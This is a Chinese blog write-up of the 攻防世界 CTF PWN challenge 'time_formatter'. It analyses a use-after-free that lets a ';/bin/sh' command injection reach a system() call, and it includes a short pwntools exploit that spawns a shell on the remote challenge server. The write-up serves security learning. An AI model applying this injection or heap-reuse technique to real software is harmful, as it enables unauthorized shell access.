---
title: '攻防世界-time_formatter'
date: 2020-10-01 17:15:18
tags: 
 - PWN
 - CTF
categories: "PWN"
banner_img: /pic/time-cover.jpg
---
# 攻防世界-time_formatter

<!-- more -->

# checksec 

```shell
kali@kali:~/桌面/pwn/time_formatter$ checksec --file=time_formatter
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        Yes   3               4               time_formatter
kali@kali:~/桌面/pwn/time_formatter$ file time_formatter 
time_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5afd38988c61546c0035e236ce938af6181e85a6, stripped
```

# IDA分析

程序有点绕，我们一步一步来分析，函数已经重命名。

{% asset_img time_formatter-ida1.png %}

read16()会读取你的选项，最多读取16字节，这里没有什么可以利用的地方。

{% asset_img time_formatter-ida2.png %}

进入setformat()函数，read0()会读取你输入的format，最大1024字节。虽然很大但是有canary保护，不能直接进行溢出。

{% asset_img time_formatter-ida4.png %}

{% asset_img time_formatter-ida5.png %}

```c
char * strdup(const char *s);
//strdup()会先用maolloc()配置与参数s 字符串相同的空间大小，然后将参数s 字符串的内容复制到该内存地址，然后把该地址返回。该地址最后可以利用free()来释放。
//返回一字符串指针，该指针指向复制后的新字符串地址。若返回NULL 表示内存不足。
```

这个相当于将我们输入的format放入了大小合适的malloc申请的堆空间中。最后返回这段空间的指针，这个指针最后被放入全局变量ptr中。

{% asset_img time_formatter-ida3.png %}

在checksec函数中，会对我们输入的format进行限制，只允许使用以上字符，

{% asset_img time_formatter-ida6.png %}

settime中同样使用read16()读取，并将time放入全局变量dword_602120中。

{% asset_img time_formatter-ida7.png %}

setzone也使用了read0()这就说明，zone也使用到了malloc，并且它并没有对输入的内容进行任何限制。

{% asset_img time_formatter-ida8.png %}

printtime中有system，而且command与我们之前的输入有关。我们能不能利用这个取得shell呢？

我们先看一下，最后一个选项：

{% asset_img time_formatter-ida9.png %}

可以看到，在没有真正退出之前它就free了format与zone申请的内存，这就是我需要利用的地方。

总结一下：

setformat：malloc一段空间，输入有限制

setzone：malloc一段空间，输入无限制

exit：过早free

printtime：执行system("/bin/date -d @%d+%s")，format为空就不执行。

知道这些，最开始的想法就是利用command。但是command中我们能控制得只有%d与%s，“/bin/date -d”要怎么办呢？

这里补充一下Linux shell的知识：

```shell
system("ls;/bin/sh;cat flag")
```

与下面的命令等价：

```shell
ls
/bin/sh
cat flag
```

系统会分别执行这三个命令。所以我们可以控制%s使其执行

```shell
system("/bin/date -d @%d;/bin/sh")
```

又因为在format输入有限制没有；这个字符，我们使用zone进行输入。

要想zone指向ptr这段空间，就要想办法把format的空间分配给zone。

正好exit函数过早进行free，根据堆的分配原理。free掉format后，调用zone，系统会从bin中把这段空间给zone。

# exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
#context.arch="amd64"

p=remote('220.249.52.133',36032)
#p=process('./time_formatter')

p.sendlineafter("> ",'1')
p.sendlineafter("Format: ",'a')
p.sendlineafter("> ",'5')
p.sendlineafter("Are you sure you want to exit (y/N)? ",'N')
p.sendlineafter("> ",'3')
p.sendlineafter("Time zone: ","';/bin/sh'")
p.sendlineafter("> ",'4')

p.interactive()
```

# flag

{% asset_img time_formatter-flag.png %}

# 总结

第一做堆相关的题目，确实比栈的绕一点。

这个题没有明显的malloc，而是通过字符串操作进行，所以这里补充一些相关知识：

```c
size_t strspn(const char *str1, const char *str2);
//功能：检索字符串 str1 中第一个不在字符串 str2 中出现的字符下标
//返回 str1 中第一个不在字符串 str2 中出现的字符下标。
```

```c
char * strdup(const char *s);
//功能：先用maolloc()配置与参数s 字符串相同的空间大小，然后将参数s 字符串的内容复制到该内存地址，然后把该地址返回。
//该地址最后可以利用free()来释放。
//返回一字符串指针，该指针指向复制后的新字符串地址。若返回NULL 表示内存不足。
```

```c
size_t strcspn(const char *str1, const char *str2);
//功能：检索字符串 str1 开头连续有几个字符都不含字符串 str2 中的字符。
//该函数返回 str1 开头连续都不含字符串 str2 中字符的字符数。
```

还有一些与环境变量相关的函数，似乎与题目关系不太大：

```c
char *getenv(const char *name);
//功能：搜索 name 所指向的环境字符串，并返回相关的值给字符串。
```

```c
int setenv(const char *name,const char * value,int overwrite);
//用来改变或增加环境变量的内容。参数name为环境变量名称字符串。参数 value则为变量内容，参数overwrite用来决定是否要改变已存在的环境变量。
//如果没有此环境变量则无论overwrite为何值均添加此环境变量。
//若环境变量存在，当overwrite不为0时，原内容会被改为参数value所指的变量内容；
//当overwrite为0时，则参数value会被忽略。
//返回值 执行成功则返回0，有错误发生时返回-1。
```